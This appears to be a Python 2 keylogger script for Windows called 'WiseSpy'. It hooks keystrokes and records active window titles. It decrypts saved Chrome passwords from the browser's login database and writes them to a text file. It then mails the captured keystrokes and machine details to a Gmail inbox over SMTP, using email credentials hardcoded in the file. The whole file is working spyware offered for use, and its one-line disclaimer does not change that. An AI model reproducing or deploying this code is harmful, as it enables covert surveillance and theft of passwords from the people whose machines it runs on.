
# WiseSpy / Pythogen
# Wayne Kenney - 2017

# This is a keylogger that captures keyinput and sends the logged keystrokes to
# a specified GMail inbox for review. This enables you to avoid dealing with sockets
# or listening network ports which may be detected by firewall or network monitoring.

# Update 8/23/17 - The keylogger now gathers active window titles! The titles are recorded
# when you click on a window with a mouseClick event. All active windows are recorded with 
# the keystrokes.

# Update 8/24/17 - The title solution has been perfected! There's a condition
# in the key detection function that determines whether or not the window title is different:
# If the window title is different, then call title function.

# Disclaimer:
# This is not intended for malicious purposes..
# Do not keylog for malicious reasons!



# Include Modules
import os
import sqlite3
import win32crypt
from ctypes import *
import smtplib
import pyHook, pythoncom, sys, logging
import os

# log List
grab = []

# Access DLLs
user32 = windll.user32
kernel32 = windll.kernel32
winTitle = None



def deliverMe(feedMe):

	# Variable for list conversion
	a = ''

	# Cycle feedMe list and..
	for i in feedMe:
		# Append as string within variable 'a'
		a = a + i

	# Terminal Activity Condition
	if feedMe=="formLoad":
		# Activation terminal notification
		print "\nWiseSpy Activated!\n"
	else:
		# Collected Keys to be sent to inbox.
		print "\nRecorded Keystrokes: %s\n" % (a)

	# Put your keylog bot's authentication details here
	# This GMail account will send you the logged keystrokes
	gmail_user = 'pyhannahmaple@gmail.com'  
	gmail_password = 'Aquabat6464!~'

	sent_from = gmail_user  
	# Put your receiving GMail address here!
	# This is where the keystrokes are sent to.
	to = ['waynekenneyjr@gmail.com']  
	subject = 'WiseSpy - Pythogen'  

	filename = "pwd.txt"
	attachment = open("pwd.txt") 

	# Email Body Condition (Activation OR Keylogs)
	if feedMe == "formLoad":
		body = "\nWiseSpy Activated!\n\nMachine: %s\n\nListening for Activity..." % os.environ['COMPUTERNAME']
	else:
		# Give body keystrokes. View from inbox ;)
		body = a

	email_text = """\  
	From: %s  
	To: %s  
	Subject: %s
	attachment %s
	%s
	""" % (sent_from, ", ".join(to), subject, filename, body)

	try:  
	    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	    server.ehlo()
	    server.login(gmail_user, gmail_password)
	    server.sendmail(sent_from, to, email_text)
	    server.close()
	    print 'Email sent to %s.\n' % (gmail_user)
	except:  
	    print 'oops! Check code...'
	    
	return True



def OnKeyboardEvent(event):
    # globalize for Window Title Condition
    global winTitle

    # If window title is different, then call title function
    if event.WindowName != winTitle:
    	winTitle = event.WindowName
    	getWindowTitle()

    # Keylog related code...
    logging.basicConfig(level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii) + " - %s" % len(grab))
    grab.append( chr(event.Ascii))

    # This condition checks how many keystrokes detected
    # When X amount of keystrokes detected, send key list to email function
    if len(grab) >= 200:
    	print '\ndelivering keys via GMAIL ;)'

    	# Call delivery function with keystroke list
    	deliverMe(grab)

    	# Clear list for more logging
    	del grab[:]
    else:
    	pass

    return True
    


# Detect Window Title
def getWindowTitle():
	# Get window in focus
	hwnd = user32.GetForegroundWindow()

	# Extract the window's title
	title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(title),512)
	
	# Display title in console
	print "\n\n[ %s ]\n\n" % ( title.value)
	grab.append("\n\n[ " + title.value + " ]\n\n")
	
	# Close
	kernel32.CloseHandle(hwnd)
	return True

def getSaveChromePW():

	#path to user's login data
	data_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
	login_db = os.path.join(data_path, 'Login Data')
	#db connect and query
	c = sqlite3.connect(login_db)
	cursor = c.cursor()
	select_statement = "SELECT origin_url, username_value, password_value FROM logins"
	cursor.execute(select_statement)
	login_data = cursor.fetchall()
	#URL: credentials dictionary
	credential = {}
	#decrytping the password
	for url, user_name, pwd, in login_data:
		pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0) #This returns a tuple description and the password
		credential[url] = (user_name, pwd[1])
	#writing to a text file (CAUTION: Don't leave this text file around!)
	prompt = 'y'
	if prompt == 'y':
		with open('pwd.txt', 'w') as f:
			for url, credentials in credential.iteritems():
				if credentials[1]:
					f.write("\n"+url+"\n"+credentials[0].encode('utf-8')+ " | "+credentials[1]+"\n")
				else:
					f.write("\n"+url+"\n"+"USERNAME NOT FOUND | PASSWORD NOT FOUND \n")
		print "[.] Successfully written to pwd.txt!"
	else:
		quit()



# Activation Email - Inbox Notification (Relay PC details)
deliverMe("formLoad")

# Initial Chrome Password Extraction
getSaveChromePW()

# Hook keyboard 
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()